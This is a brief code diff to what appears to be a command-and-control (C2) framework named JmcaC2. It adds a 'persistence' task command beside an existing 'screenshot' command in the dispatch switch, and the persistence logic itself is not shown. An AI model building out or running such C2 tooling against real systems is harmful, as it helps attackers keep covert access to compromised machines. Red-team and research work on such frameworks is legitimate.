@@ -112,6 +112,9 @@ namespace JmcaC2
                     case "screenshot":
                         CreateTask(CmdPrefix, CmdArgs);
                         break;
+                    case "persistence":
+                        CreateTask(CmdPrefix, CmdArgs);
+                        break;
 
 
                     // add more commands as needed :)
